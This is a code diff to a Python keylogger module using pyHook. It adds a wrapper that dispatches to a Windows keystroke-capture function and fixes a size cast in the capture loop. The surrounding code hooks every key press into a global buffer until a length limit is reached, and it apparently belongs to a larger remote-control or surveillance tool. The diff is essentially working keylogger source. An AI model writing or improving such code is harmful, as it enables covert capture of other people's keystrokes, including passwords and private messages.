@@ -1,6 +1,7 @@
 import win32api 
 import sys
 import pythoncom, pyHook 
+import os
 
 keysPressed = ">"
 def OnKeyboardEvent(event):
@@ -11,12 +12,18 @@ def OnKeyboardEvent(event):
         keysPressed += "/n"
     return True
 
+def keylogger(size):
+    if  os.name=="nt":
+        return keylogger_win(size)
+    else:
+        return "Not available"
+
 def keylogger_win(size):       
     global keysPressed   
     hm = pyHook.HookManager()  
     hm.KeyDown = OnKeyboardEvent 
     hm.HookKeyboard() 
-    while len(keysPressed) < size:
+    while len(keysPressed) < int(size):
         pythoncom.PumpWaitingMessages()
     else:
         hm.UnhookKeyboard()
